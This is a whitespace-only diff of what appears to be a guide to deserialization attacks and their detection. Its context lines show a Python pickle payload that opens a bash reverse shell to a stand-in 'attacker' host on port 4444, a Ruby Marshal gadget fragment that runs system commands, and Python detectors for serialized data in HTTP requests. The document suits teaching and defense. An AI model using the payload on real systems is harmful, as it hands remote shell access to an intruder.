@@ -187,7 +187,7 @@ print(payload)
 class Exploit:
     def __reduce__(self):
         import subprocess
-        return (subprocess.Popen, 
+        return (subprocess.Popen,
                 (('bash', '-c', 'bash -i >& /dev/tcp/attacker/4444 0>&1'),))
 ```
 
@@ -246,7 +246,7 @@ class Exploit
   def initialize(cmd)
     @cmd = cmd
   end
-  
+
   def call
     system(@cmd)
   end
@@ -265,7 +265,7 @@ class Gem::Requirement
   def marshal_dump
     [@requirements]
   end
-  
+
   def marshal_load(array)
     @requirements = array
   end
@@ -310,7 +310,7 @@ def detect_java_serial(data):
         r'rO0AB[A-Za-z0-9+/]+=*',  # Base64 Java serialized
         b'\xac\xed\x00\x05',        # Raw magic bytes
     ]
-    
+
     if isinstance(data, str):
         if re.search(patterns[0], data):
             return "Java serialized object detected (base64)"
@@ -326,7 +326,7 @@ def detect_php_serial(data):
         r'a:\d+:{',         # Array
         r's:\d+:"',         # String
     ]
-    
+
     for pattern in php_patterns:
         if re.search(pattern, data):
             return "PHP serialized data detected"
@@ -348,21 +348,21 @@ def detect_pickle(data):
 def scan_request(headers, body, cookies):
     """Scan HTTP request for deserialization."""
     findings = []
-    
+
     # Check all data sources
     for name, data in [('Body', body), ('Cookies', str(cookies))]:
         result = detect_java_serial(data)
         if result:
             findings.append(f"{name}: {result}")
-        
+
         result = detect_php_serial(data)
         if result:
             findings.append(f"{name}: {result}")
-        
+
         result = detect_pickle(data)
         if result:
             findings.append(f"{name}: {result}")
-    
+
     return findings
 
 if __name__ == "__main__":
